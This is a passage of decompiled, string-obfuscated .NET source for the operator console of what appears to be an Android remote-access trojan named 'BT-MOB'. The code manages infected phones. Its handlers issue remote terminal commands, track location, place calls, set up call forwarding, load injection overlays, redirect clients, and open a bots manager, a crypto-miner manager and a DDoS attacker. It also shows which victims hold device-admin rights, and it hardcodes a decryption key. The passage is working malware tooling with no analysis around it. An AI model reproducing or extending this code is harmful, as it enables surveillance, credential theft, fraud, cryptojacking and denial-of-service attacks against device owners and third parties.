		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._653D434A;
		myinputs2.inputtext.Text = EXGuarder._16652E04;
		myinputs2.inputtext.Watermark = EXGuarder._48400727;
		if (myinputs2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		_16652E = myinputs2.inputtext.Text;
		if (codes.StrisEmpty(_16652E))
		{
			BTAlerter.Warnings(EXGuarder._664D6E52);
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (Operators.CompareString(targetid, EXGuarder._16652E04, TextCompare: false) == 0 || Operators.CompareString(bTClient.mobid, targetid, TextCompare: false) == 0)
					{
						VB_0024AnonymousType_12<string> data = new VB_0024AnonymousType_12<string>(_16652E);
						string value = BTCommand.FormatCommand(EXGuarder._2E197600, data);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._1924346C, BTConst.wrk);
						dictionary.Add(EXGuarder._6A183473, value);
						Dictionary<string, object> chatData = dictionary;
						bTClient.Serverins.WSClient.SendComCommand(chatData, bTClient.mobid, bTClient.IsSecured);
						selectedRow.Cells[3].Value = _16652E;
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void RedirectToolStripMenuItem_Click(object sender, EventArgs e)
	{
		BTAlerter.infos(EXGuarder._28102A13);
	}

	private void CheckUpdate(string Serverip, bool byuser)
	{
		if (checkingnow)
		{
			BTAlerter.infos(BTConst.pleasewait);
			return;
		}
		ServersInfo sinfoByip = codes.getSinfoByip(AllServers, Serverip);
		if (sinfoByip == null)
		{
			BTAlerter.infos(EXGuarder._54644C3B);
			return;
		}
		Thread thread = new Thread([SpecialName] async () =>
		{
			Thread.Sleep(3000);
			checkingnow = true;
			string text = codes.StrGenerator(32);
			try
			{
				string serverNextKey = ServersMgr.GetServerNextKey(Serverip);
				VB_0024AnonymousType_2<string, string, string> vB_0024AnonymousType_ = new VB_0024AnonymousType_2<string, string, string>("check", text, serverNextKey);
				TaskAwaiter<(bool, object)> taskAwaiter = MyServer.FetchUpdates(vB_0024AnonymousType_, sinfoByip.MainhttpClient, Serverip).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter<(bool, object)> taskAwaiter2 = default(TaskAwaiter<(bool, object)>);
					taskAwaiter = taskAwaiter2;
				}
				(bool, object) result = taskAwaiter.GetResult();
				(bool, object) tuple = result;
				if (tuple.Item1)
				{
					string text2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(tuple.Item2, null, "Replace", new object[2] { "\\", "" }, null, null, null), null, "Trim", new object[1] { "\"" }, null, null, null)));
					string text3;
					try
					{
						text3 = MyServer.DecryptReply(text, "BT-MOB!B6twG9+&U", text2);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						text3 = null;
						ProjectData.ClearProjectError();
					}
					if (!codes.StrisEmpty(text3))
					{
						JObject jObject = JObject.Parse(text3);
						_ = (string?)jObject["version"];
						string right = (string?)jObject["hash"];
						_ = (string?)jObject["date"];
						_ = (string?)jObject["size"];
						string mD5Hash = codes.GetMD5Hash(Application.ExecutablePath);
						if (Operators.CompareString(mD5Hash, right, TextCompare: false) == 0)
						{
							if (byuser)
							{
								MyMsg.Show(BTConst.myname, BTConst.updatedstr, MyMsg.msgtype.Confirm, use_no: false);
							}
						}
						else
						{
							Invoke((Action)([SpecialName] () =>
							{
								BTAlerter.Success(BTConst.Nupdatestr);
								if (byuser && MyMsg.Show(BTConst.myname, BTConst.Nupdatestr, MyMsg.msgtype.Confirm, use_no: true) == DialogResult.OK)
								{
									updatewindow updatewindow2 = new updatewindow();
									updatewindow2.serverinfo = sinfoByip;
									updatewindow2.Show();
								}
							}));
						}
					}
					else
					{
						Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
						{
							BTAlerter.erroes(text2);
						}));
					}
				}
				else
				{
					Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
					{
						BTAlerter.erroes(Conversions.ToString(tuple.Item2));
					}));
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Exception ex3 = ex2;
				Debuger.Log_e("updater_DoWork", codes.EXtoString(ex3));
				ProjectData.ClearProjectError();
			}
			checkingnow = false;
		});
		thread.IsBackground = true;
		thread.Start();
	}

	public void ToolStrip_location_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._416C2255 + bTClient.mobid;
					LocationMap locationMap = (LocationMap)MyProject.Application.OpenForms[name];
					if (locationMap == null)
					{
						locationMap = new LocationMap();
						locationMap.Name = name;
						locationMap.BTcli = bTClient;
						locationMap.Show();
					}
					else
					{
						locationMap.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void RedirectClients()
	{
		if (DGV0.Rows.Count <= 0)
		{
			return;
		}
		List<BTClient> list = new List<BTClient>();
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient item = (BTClient)selectedRow.Cells[0].Tag;
					list.Add(item);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
		if (list.Count <= 0)
		{
			return;
		}
		if (redirectform == null || redirectform.IsDisposed)
		{
			redirectform = new Redirector();
			redirectform.listclients = list;
			redirectform.FormClosed += [SpecialName] [DebuggerHidden] (object a0, FormClosedEventArgs a1) =>
			{
				_Lambda_0024__148_002D0();
			};
			redirectform.Show();
		}
		else
		{
			redirectform.BringToFront();
			redirectform.Focus();
		}
	}

	private void jector_Click(object sender, EventArgs e)
	{
		if (jectform != null)
		{
			return;
		}
		string injections_Path = MyRes.injections_Path;
		string[] array = null;
		jectform = new ijectionlab();
		if (Directory.Exists(injections_Path))
		{
			array = Directory.GetFiles(injections_Path, EXGuarder._614C0D6B);
		}
		if (array != null && array.Length > 0)
		{
			string[] array2 = array;
			foreach (string path in array2)
			{
				jectform.jectslist.Items.Add(Path.GetFileNameWithoutExtension(path));
			}
		}
		jectform.ShowDialog();
		jectform = null;
		Allinjections = codes.loadjectors(MyRes.injections_Path);
	}

	private void DataGridView1_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
		DataGridView dataGridView = (DataGridView)sender;
		if (e.RowIndex < 0 || e.ColumnIndex < 0 || e.RowIndex >= dataGridView.Rows.Count)
		{
			return;
		}
		e.Handled = true;
		Rectangle cellBounds = e.CellBounds;
		cellBounds.Inflate(-1, -1);
		int radius = 8;
		int columnIndex = e.ColumnIndex;
		checked
		{
			int num = dataGridView.ColumnCount - 1;
			Color color = Color.FromArgb(6, 10, 15);
			Color color2 = Color.FromArgb(6, 10, 15);
			Color color3 = Color.FromArgb(16, 20, 27);
			Color color4 = Color.FromArgb(6, 10, 15);
			Color color5 = Color.FromArgb(250, 250, 250);
			Color color6 = Color.FromArgb(180, 180, 180);
			Color color7 = Color.FromArgb(0, 180, 120);
			using (SolidBrush brush = new SolidBrush(color))
			{
				e.Graphics.FillRectangle(brush, e.CellBounds);
			}
			bool selected = dataGridView.Rows[e.RowIndex].Selected;
			Color color8 = (selected ? color3 : color2);
			Color foreColor = color6;
			Color foreColor2 = dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Style.ForeColor;
			if (!foreColor2.IsEmpty)
			{
				foreColor = foreColor2;
			}
			if (selected)
			{
				foreColor = color5;
			}
			GraphicsPath graphicsPath = null;
			if (columnIndex == 0)
			{
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: true, roundTopRight: false, roundBottomRight: false);
			}
			else if (columnIndex == num)
			{
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: false, roundTopRight: true, roundBottomRight: true, roundBottomLeft: false);
			}
			else
			{
				graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(cellBounds);
			}
			e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
			using (SolidBrush brush2 = new SolidBrush(color8))
			{
				using Pen pen = new Pen(selected ? color3 : color4);
				e.Graphics.FillPath(brush2, graphicsPath);
				e.Graphics.DrawPath(pen, graphicsPath);
			}
			if (selected && columnIndex == 0)
			{
				using SolidBrush brush3 = new SolidBrush(color7);
				e.Graphics.FillRectangle(brush3, cellBounds.X + 1, cellBounds.Y + 6, 4, cellBounds.Height - 12);
			}
			e.Graphics.SmoothingMode = SmoothingMode.None;
			if (e.Value != null && e.Value is Image)
			{
				if (e.ColumnIndex == 0)
				{
					if (!(dataGridView.Rows[e.RowIndex].Cells[1].Tag is CellImages { Avatar: var avatar, Flag: var flag }))
					{
						graphicsPath.Dispose();
						return;
					}
					if (avatar != null)
					{
						Image image = (Image)e.Value;
						Rectangle rect = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - image.Width) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - image.Height) / 2), image.Width, image.Height);
						e.Graphics.DrawImage(avatar, rect);
						if (flag != null && !HideFlagicon)
						{
							int num2 = 18;
							Rectangle rect2 = new Rectangle(rect.Right - num2 + 10, rect.Bottom - num2 + 4, num2, num2);
							e.Graphics.DrawImage(flag, rect2);
						}
						if (dataGridView.Rows[e.RowIndex].Cells[0].Tag is BTClient { isDeviceAdmin: not false })
						{
							Image adminright_on = Resources.adminright_on;
							int num3 = 18;
							Rectangle rect3 = new Rectangle(rect.Left - 10, rect.Bottom - num3 + 4, num3, num3);
							e.Graphics.DrawImage(adminright_on, rect3);
						}
					}
				}
				else
				{
					Image image2 = (Image)e.Value;
					Rectangle rect4 = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - image2.Width) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - image2.Height) / 2), image2.Width, image2.Height);
					e.Graphics.DrawImage(image2, rect4);
				}
			}
			else if (e.Value != null)
			{
				string text = e.FormattedValue.ToString();
				Rectangle bounds = cellBounds;
				bounds.Inflate(-10, 0);
				Font font = e.CellStyle.Font;
				if (TextRenderer.MeasureText(text, font, new Size(int.MaxValue, int.MaxValue), TextFormatFlags.SingleLine).Width > bounds.Width)
				{
					float num4 = font.Size;
					while (num4 > 6f)
					{
						num4 -= 0.5f;
						using Font font2 = new Font(font.FontFamily, num4, font.Style);
						if (TextRenderer.MeasureText(text, font2, new Size(int.MaxValue, int.MaxValue), TextFormatFlags.SingleLine).Width <= bounds.Width)
						{
							font = (Font)font2.Clone();
							break;
						}
					}
				}
				TextRenderer.DrawText(e.Graphics, text, font, bounds, foreColor, TextFormatFlags.SingleLine | TextFormatFlags.VerticalCenter);
				if (font != e.CellStyle.Font)
				{
					font.Dispose();
				}
			}
			graphicsPath.Dispose();
		}
	}

	private void DGV0_MouseWheel(object sender, MouseEventArgs e)
	{
		checked
		{
			try
			{
				int num = -Math.Sign(e.Delta);
				int num2 = DGV0.FirstDisplayedScrollingRowIndex + num;
				if (num2 < 0)
				{
					num2 = 0;
				}
				if (num2 >= DGV0.RowCount)
				{
					num2 = DGV0.RowCount - 1;
				}
				DGV0.FirstDisplayedScrollingRowIndex = num2;
				DrakeUIScrollBar1.Value = num2;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIScrollBar1_ValueChanged(object sender, EventArgs e)
	{
		try
		{
			if (DrakeUIScrollBar1.Value >= 0 && DrakeUIScrollBar1.Value < DGV0.Rows.Count)
			{
				DGV0.FirstDisplayedScrollingRowIndex = DrakeUIScrollBar1.Value;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void DGV0_Scroll(object sender, ScrollEventArgs e)
	{
		DrakeUIScrollBar1.Value = e.NewValue;
	}

	public void ShowToast_Click(object sender, EventArgs e, string targetid = "")
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		string _45703F = EXGuarder._45703F03;
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._2971711E;
		myinputs2.inputtext.Text = EXGuarder._45703F03;
		myinputs2.inputtext.Watermark = EXGuarder._15345066;
		if (myinputs2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		_45703F = myinputs2.inputtext.Text;
		if (codes.StrisEmpty(_45703F))
		{
			_45703F = EXGuarder._4C6C5B2E;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null && (Operators.CompareString(targetid, EXGuarder._45703F03, TextCompare: false) == 0 || Operators.CompareString(bTClient.mobid, targetid, TextCompare: false) == 0))
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._6C1A0B26, EXGuarder._32215A33);
						dictionary.Add(EXGuarder._740A4646, EXGuarder._2A1D0D54);
						dictionary.Add(EXGuarder._793D6D41, _45703F);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Openlink_Click(object sender, EventArgs e, string targetid = "")
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		string _3E6F0B = EXGuarder._3E6F0B31;
		myinputs myinputs2 = new myinputs();
		myinputs2.msgtitle.Text = EXGuarder._45045161;
		myinputs2.inputtext.Text = EXGuarder._3E6F0B31;
		myinputs2.inputtext.Watermark = EXGuarder._4C0A3953;
		if (myinputs2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		_3E6F0B = myinputs2.inputtext.Text;
		if (codes.StrisEmpty(_3E6F0B))
		{
			_3E6F0B = EXGuarder._31641B2B;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null && (Operators.CompareString(targetid, EXGuarder._3E6F0B31, TextCompare: false) == 0 || Operators.CompareString(bTClient.mobid, targetid, TextCompare: false) == 0))
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._61004A6B, EXGuarder._3E057213);
						dictionary.Add(EXGuarder._5500244F, EXGuarder._3E311C53);
						dictionary.Add(EXGuarder._610C6212, _3E6F0B);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem1_Click_1(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		string _372B273B = EXGuarder._372B273B;
		string _372B273B2 = EXGuarder._372B273B;
		ttsform ttsform2 = new ttsform();
		ttsform2.inputtext.Text = EXGuarder._372B273B;
		ttsform2.inputtext.Watermark = EXGuarder._0B586651;
		if (ttsform2.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		_372B273B = ttsform2.inputtext.Text;
		if (codes.StrisEmpty(_372B273B))
		{
			_372B273B = EXGuarder._2A160C38;
		}
		string text = ttsform2.langtext.Text;
		switch (global::_003CPrivateImplementationDetails_003E.ComputeStringHash(text))
		{
		case 463134907u:
			if (Operators.CompareString(text, EXGuarder._1D662F5A, TextCompare: false) != 0)
			{
				goto default;
			}
			_372B273B2 = EXGuarder._08076C52;
			break;
		case 2808930345u:
			if (Operators.CompareString(text, EXGuarder._5A336C61, TextCompare: false) != 0)
			{
				goto default;
			}
			_372B273B2 = EXGuarder._4E550375;
			break;
		case 1797204927u:
			if (Operators.CompareString(text, EXGuarder._25442452, TextCompare: false) != 0)
			{
				goto default;
			}
			_372B273B2 = EXGuarder._713D2F4E;
			break;
		case 1760062771u:
			if (Operators.CompareString(text, EXGuarder._74272A50, TextCompare: false) != 0)
			{
				goto default;
			}
			_372B273B2 = EXGuarder._6E672A4B;
			break;
		case 3399016062u:
			if (Operators.CompareString(text, EXGuarder._615F0B32, TextCompare: false) != 0)
			{
				goto default;
			}
			_372B273B2 = EXGuarder._5E1F183D;
			break;
		case 645218338u:
			if (Operators.CompareString(text, EXGuarder._06055D2B, TextCompare: false) != 0)
			{
				goto default;
			}
			_372B273B2 = EXGuarder._682A6A3E;
			break;
		case 435204190u:
			if (Operators.CompareString(text, EXGuarder._710B0E3E, TextCompare: false) != 0)
			{
				goto default;
			}
			_372B273B2 = EXGuarder._094E5428;
			break;
		default:
			_372B273B2 = EXGuarder._08076C52;
			break;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null)
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._6346372B, EXGuarder._09424F1E);
						dictionary.Add(EXGuarder._771A2335, EXGuarder._45552D05);
						dictionary.Add(EXGuarder._60006A19, _372B273B2);
						dictionary.Add(EXGuarder._75171619, _372B273B);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	public void SendVibrate_Click(object sender, EventArgs e, string targetid = "")
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null && (Operators.CompareString(targetid, EXGuarder._1D4B5413, TextCompare: false) == 0 || Operators.CompareString(bTClient.mobid, targetid, TextCompare: false) == 0))
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._3601441A, EXGuarder._77146107);
						dictionary.Add(EXGuarder._18355804, EXGuarder._0649792E);
						dictionary.Add(EXGuarder._450E4864, EXGuarder._16511636);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void TerminalToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag != null)
				{
					BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
					if (bTClient.mobid != null)
					{
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._2B365825, EXGuarder._65040647);
						dictionary.Add(EXGuarder._33421C3C, EXGuarder._5E4F0A62);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, bTClient.mobid, bTClient.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void UpdateClients()
	{
		if (DGV0.Rows.Count <= 0)
		{
			return;
		}
		List<BTClient> list = new List<BTClient>();
		foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
		{
			try
			{
				if (item.Tag != null)
				{
					BTClient bTClient = (BTClient)item.Cells[0].Tag;
					if (codes.IsVersionGreater(bTClient.version, EXGuarder._366E4169))
					{
						list.Add(bTClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
		if (list.Count <= 0)
		{
			return;
		}
		if (updateform == null || updateform.IsDisposed)
		{
			updateform = new Clientsupdater();
			updateform.listclients = list;
			updateform.FormClosed += [SpecialName] [DebuggerHidden] (object a0, FormClosedEventArgs a1) =>
			{
				_Lambda_0024__166_002D0();
			};
			updateform.Show();
		}
		else
		{
			updateform.BringToFront();
			updateform.Focus();
		}
	}

	private void CallPhoneToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid != null)
				{
					string name = EXGuarder._4C1C3938 + bTClient.mobid;
					phonecaller phonecaller2 = (phonecaller)MyProject.Application.OpenForms[name];
					if (phonecaller2 == null)
					{
						phonecaller2 = new phonecaller();
						phonecaller2.Name = name;
						phonecaller2.Btcli = bTClient;
						phonecaller2.Show();
					}
					else
					{
						phonecaller2.BringToFront();
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void CallForwardingToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				if (selectedRow.Tag == null)
				{
					continue;
				}
				BTClient bTClient = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient.mobid == null)
				{
					continue;
				}
				string name = EXGuarder._7902360E + bTClient.mobid;
				callforwarding callforwarding2 = (callforwarding)MyProject.Application.OpenForms[name];
				if (callforwarding2 == null)
				{
					callforwarding2 = new callforwarding();
					callforwarding2.Name = name;
					callforwarding2.Btcli = bTClient;
					if (bTClient.sim.Contains(EXGuarder._3D234842))
					{
						string[] array = bTClient.sim.Split(EXGuarder._3D234842);
						string[] array2 = array;
						foreach (string item in array2)
						{
							callforwarding2.combosims.Items.Add(item);
						}
					}
					else if (Operators.CompareString(bTClient.sim, EXGuarder._5666033C, TextCompare: false) != 0)
					{
						callforwarding2.combosims.Items.Add(bTClient.sim);
					}
					callforwarding2.Show();
				}
				else
				{
					callforwarding2.BringToFront();
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void BotsManager()
	{
		List<BTClient> list = new List<BTClient>();
		if (DGV0.Rows.Count > 0)
		{
			foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
			{
				try
				{
					if (item.Tag != null)
					{
						BTClient bTClient = (BTClient)item.Cells[0].Tag;
						if (codes.IsVersionGreater(bTClient.version, EXGuarder._2F26541D))
						{
							list.Add(bTClient);
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}
		if (BotsForm == null || BotsForm.IsDisposed)
		{
			string _775F = EXGuarder._775F7100;
			BotsForm = new BotsManager();
			BotsForm.listclients = list;
			BotsForm.Name = _775F;
			BotsForm.FormClosed += [SpecialName] [DebuggerHidden] (object a0, FormClosedEventArgs a1) =>
			{
				_Lambda_0024__170_002D0();
			};
			BotsForm.Show();
		}
		else
		{
			BotsForm.BringToFront();
			BotsForm.Focus();
		}
	}

	private void openminer()
	{
		List<BTClient> list = new List<BTClient>();
		if (DGV0.Rows.Count > 0)
		{
			foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
			{
				try
				{
					if (item.Tag != null)
					{
						BTClient bTClient = (BTClient)item.Cells[0].Tag;
						if (codes.IsVersionGreater(bTClient.version, EXGuarder._43607776))
						{
							list.Add(bTClient);
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}
		if (list.Count <= 0)
		{
			return;
		}
		if (minerform == null || minerform.IsDisposed)
		{
			string _2B350B = EXGuarder._2B350B53;
			minerform = new minersmanager();
			minerform.listclients = list;
			minerform.Name = _2B350B;
			minerform.FormClosed += [SpecialName] [DebuggerHidden] (object a0, FormClosedEventArgs a1) =>
			{
				_Lambda_0024__172_002D0();
			};
			minerform.Show();
		}
		else
		{
			minerform.BringToFront();
			minerform.Focus();
		}
	}

	private void Ddosattacker()
	{
		List<BTClient> list = new List<BTClient>();
		if (DGV0.Rows.Count > 0)
		{
			foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
			{
				try
				{
					if (item.Tag != null)
					{
						BTClient bTClient = (BTClient)item.Cells[0].Tag;
						if (codes.IsVersionGreater(bTClient.version, EXGuarder._402B646E))
						{
							list.Add(bTClient);
						}
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}
		if (list.Count <= 0)
		{
			return;
		}
		if (ddosform == null || ddosform.IsDisposed)
		{
			string _795A3D = EXGuarder._795A3D06;
			ddosform = new ddosattacker();
			ddosform.listclients = list;
			ddosform.Name = _795A3D;
			ddosform.FormClosed += [SpecialName] [DebuggerHidden] (object a0, FormClosedEventArgs a1) =>
			{
				_Lambda_0024__174_002D0();
			};
			ddosform.Show();
		}
		else
		{
			ddosform.BringToFront();
			ddosform.Focus();
		}
	}

	private void DrakeUIButtonIcon4_Click_1(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	private void DrakeWidth_W3_Load(object sender, EventArgs e)
	{
	}

	private void UpdateActiveClientPanel()
	{
		try
		{
			if (DGV0.SelectedRows.Count == 0)
			{
				if (lastState != -1)
				{
					lastState = -1;
					lastClientID = EXGuarder._3760565F;
					lastMultiSignature = EXGuarder._3760565F;
					barview.CoreWebView2.ExecuteScriptAsync(EXGuarder._4C287249);
				}
				return;
			}
			if (DGV0.SelectedRows.Count == 1)
			{
				DataGridViewRow dataGridViewRow = DGV0.SelectedRows[0];
				BTClient bTClient = (BTClient)dataGridViewRow.Cells[0].Tag;
				if (bTClient != null)
				{
					string mobid = bTClient.mobid;
					bool flag = DGV0.Rows.Count == 1;
					if (lastState != 1 || Operators.CompareString(mobid, lastClientID, TextCompare: false) != 0 || flag)
					{
						lastState = 1;
						lastClientID = mobid;
						lastMultiSignature = EXGuarder._3760565F;
						JObject jObject = new JObject
						{
							{
								EXGuarder._4D306364,
								codes.BitmapToBase64(bTClient.wallpaper)
							},
							{
								EXGuarder._5522166E,
								codes.BitmapToBase64(bTClient.flag)
							},
							{
								EXGuarder._766C3C0A,
								bTClient.name
							},
							{
								EXGuarder._474D4C52,
								bTClient.MobName
							},
							{
								EXGuarder._0E381108,
								bTClient.charging
							},
							{
								EXGuarder._08372509,
								bTClient.sim
							},
							{
								EXGuarder._43142959,
								bTClient.lights
							},
							{
								EXGuarder._19482261,
								bTClient.android
							},
							{
								EXGuarder._2B211C0F,
								bTClient.angle
							},
							{
								EXGuarder._5D77030F,
								bTClient.mobid
							},
							{
								EXGuarder._782B053C,
								bTClient.installdate
							}
						};
						string javaScript = string.Format(EXGuarder._4437292C, jObject.ToString(Formatting.None), bTClient.name, bTClient.country);
						barview.CoreWebView2.ExecuteScriptAsync(javaScript);
					}
				}
				return;
			}
			List<string> list = new List<string>();
			foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
			{
				BTClient bTClient2 = (BTClient)selectedRow.Cells[0].Tag;
				if (bTClient2 != null)
				{
					list.Add(bTClient2.mobid);
				}
			}
			list.Sort();
			string right = string.Join(EXGuarder._0B336222, list);
			if (lastState == 2 && Operators.CompareString(lastMultiSignature, right, TextCompare: false) == 0)
			{
				return;
			}
			lastState = 2;
			lastClientID = EXGuarder._3760565F;
			lastMultiSignature = right;
			JArray jArray = new JArray();
			foreach (DataGridViewRow selectedRow2 in DGV0.SelectedRows)
			{
				BTClient bTClient3 = (BTClient)selectedRow2.Cells[0].Tag;
				jArray.Add(new JObject
				{
					{
						EXGuarder._4D306364,
						codes.BitmapToBase64(bTClient3.wallpaper)
					},
					{
						EXGuarder._5522166E,
						codes.BitmapToBase64(bTClient3.flag)
					},
					{
						EXGuarder._766C3C0A,
						bTClient3.name
					},
					{
						EXGuarder._474D4C52,
						bTClient3.MobName
					},
					{
						EXGuarder._0E381108,
						bTClient3.charging
					},
					{
						EXGuarder._08372509,
						bTClient3.sim
					},
					{
						EXGuarder._43142959,
						bTClient3.lights
					},
					{
						EXGuarder._19482261,
						bTClient3.android
					},
					{
						EXGuarder._2B211C0F,
						bTClient3.angle
					},
					{
						EXGuarder._5D77030F,
						bTClient3.mobid
					},
					{
						EXGuarder._782B053C,
						bTClient3.installdate
					}
				});
			}
			string text = JsonConvert.SerializeObject(jArray);
			text = text.Replace(EXGuarder._0B4E4842, EXGuarder._1376096D);
			string javaScript2 = string.Format(EXGuarder._4E32136A, text);
